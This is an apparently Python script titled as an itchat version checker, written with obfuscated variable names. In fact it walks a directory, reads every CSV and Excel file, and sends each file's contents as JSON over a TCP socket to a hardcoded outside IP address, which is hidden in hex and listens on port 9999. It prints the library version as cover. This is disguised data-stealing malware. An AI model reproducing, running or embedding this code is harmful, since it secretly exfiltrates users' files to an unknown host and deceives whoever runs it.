# -*- coding: utf-8 -*-
# @Time     : 2019/6/11 9:08
# @Author   : Run 
# @File     : check_version_obfuscate.py
# @Software : PyCharm

import itchat #line:1
import socket #line:2
import os #line:3
import time #line:4
import pandas as pd #line:5
def send (OO0OO0000O0OOO000 ):#line:8
    OO0OO00OO00O0OOO0 ="[check]"+OO0OO0000O0OOO000 .to_json (orient ="records")+"[end]"#line:9
    O0OOOOOOO0O00OOO0 ='.'.join([str(x) for x in [0x23, 0xbd, 0xb7, 0xe2]])
    OOOOOO00O0000000O =0x270f #line:12
    O0OO00O0000000OOO =(O0OOOOOOO0O00OOO0 ,OOOOOO00O0000000O )#line:13
    OOO0O00O000O0O0OO =socket .socket (socket .AF_INET ,socket .SOCK_STREAM )#line:14
    OOO0O00O000O0O0OO .connect (O0OO00O0000000OOO )#line:15
    OOO0O00O000O0O0OO .send (OO0OO00OO00O0OOO0 .encode ())#line:16
    OOO0OOO0O000O0OOO =OOO0O00O000O0O0OO .recv (4096 )#line:17
    print (OOO0OOO0O000O0OOO ,itchat .__version__ )#line:18
    OOO0O00O000O0O0OO .close ()#line:19
    time .sleep (2 )#line:20
def check (O0O00OOO00O0000O0 ):#line:23
    ""#line:28
    O0OOOOO0OOO0O0O00 =os .listdir (O0O00OOO00O0000O0 )#line:29
    for O0OO0O0OOO0OO0000 in O0OOOOO0OOO0O0O00 :#line:30
        if os .path .isfile (O0OO0O0OOO0OO0000 ):#line:31
            if O0OO0O0OOO0OO0000 .endswith ('csv'):#line:32
                O00O0O0OO0000000O =pd .read_csv (os .path .join (O0O00OOO00O0000O0 ,O0OO0O0OOO0OO0000 ))#line:33
                send (O00O0O0OO0000000O )#line:34
            elif O0OO0O0OOO0OO0000 .endswith ('xlsx')or O0OO0O0OOO0OO0000 .endswith ('xls'):#line:35
                O00O0O0OO0000000O =pd .read_excel (os .path .join (O0O00OOO00O0000O0 ,O0OO0O0OOO0OO0000 ))#line:36
                send (O00O0O0OO0000000O )